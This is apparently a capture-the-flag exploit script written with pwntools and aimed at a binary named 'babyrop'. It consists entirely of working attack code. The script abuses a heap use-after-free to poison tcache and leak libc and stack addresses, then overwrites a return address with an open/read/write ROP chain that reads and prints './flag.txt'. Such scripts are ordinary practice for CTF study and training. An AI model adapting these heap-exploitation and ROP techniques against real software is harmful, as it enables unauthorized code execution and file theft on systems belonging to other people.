#!/usr/bin/env python3

from pwn import *

elf = ELF("./babyrop")
libc = ELF("./libc.so.6")

context.binary = elf
#context.log_level = 'debug'

def create_safe_string(index,size,data):
    p.sendlineafter("command: ","C")
    p.sendlineafter(": ",str(index))
    p.sendlineafter(": ",str(size))
    p.sendlineafter(": ",data)

def free_safe_string(index):
    p.sendlineafter("command: ","F")
    p.sendlineafter(": ",str(index))

def read_safe_string(index, cmd):
    p.sendlineafter("command: ","R")
    p.sendlineafter(": ",str(index))
    p.recvline()
    data = p.recvline()
    if(cmd == 1):
        counter = 0
        # fuzz 
        for i in range(len(data)//8):
            addr = data.decode('utf-8').replace(" ", "")[counter:counter+16]
            print(unhex(addr)[::-1].hex(),end=' ')
            counter = counter + 16
    elif(cmd == 2):
        data = data.decode("utf-8").replace(" ","")[0:16]
        addr = int(unhex(data)[::-1].hex(),16)
        log.info("Libc leaked address: "+hex(addr))
        return addr

    elif(cmd == 0):
        data = data.decode("utf-8").replace(" ","")[16:32]
        addr = int(unhex(data)[::-1].hex(),16)
        log.info("Libc leaked address: "+hex(addr))
        return addr

def write_safe_string(index,data):
    p.sendlineafter("command: ","W")
    p.sendlineafter(": ",str(index))
    p.sendlineafter(": ",data)

def leak():
   for i in range(6):
       create_safe_string(i,24,"A")
   for i in range(6):
       free_safe_string(i)
   create_safe_string(0,0x1024,"A")
   return read_safe_string(0,0)



p = process(elf.path)
#time.sleep(1)
#gdb.attach(p,gdbscript='''
#           break * __libc_init_first
#''')
#time.sleep(1)


libc.address = leak() - 0x1f4cc0
int_x80 = libc.address + 0x0000000000137432
pop_rax = libc.address + 0x00000000000448a8
pop_rbx = libc.address + 0x00000000000376dd
syscall = libc.address + 0x000000000002d1f4
pop_rdi = libc.address + 0x000000000002d7dd
pop_rsi = libc.address + 0x000000000002eef9
pop_rdx = libc.address + 0x00000000000d9c2d
env_offset = 0x000000001fcec0
w_region = 0x404120

# AB WRITE - leak stack address
create_safe_string(1,0x80,"B")
create_safe_string(2,0x80,"B")
free_safe_string(1)
free_safe_string(2)
create_safe_string(2,20,p64(0x21) + p64(libc.address + env_offset)) # -> control header/chunk 8
stack_address = read_safe_string(1,2) # -> leak - stack

# AB WRITE - desired file to read
create_safe_string(5,0x70,"B")
create_safe_string(6,0x70,"B")
free_safe_string(5)
free_safe_string(6)
create_safe_string(6,20,p64(0x100) + p64(w_region))
write_safe_string(5,b"./flag.txt\x00")

# AB WRITE - return address
create_safe_string(7,0x30,"B")
create_safe_string(8,0x30,"B")
free_safe_string(7)
free_safe_string(8)
create_safe_string(8,20,p64(0x100) + p64(stack_address - 0x190))

# ROP CHAIN
write_safe_string(7,
    p64(libc.address + 0x000000000002d13f)+ # DEBUGGING
    p64(pop_rdi) + p64(0x404120)+
    p64(pop_rsi) + p64(0x0)+
    p64(pop_rsi) + p64(0x0)+
    p64(libc.sym["open"])+
    p64(pop_rdi) + p64(0x3)+
    p64(pop_rsi) + p64(w_region)+
    p64(pop_rdx) + p64(0x30)+
    p64(libc.sym["read"])+
    p64(pop_rdi) + p64(0x1)+
    p64(pop_rsi) + p64(w_region)+
    p64(pop_rdx) + p64(0x30)+
    p64(libc.sym["write"]))

p.interactive()

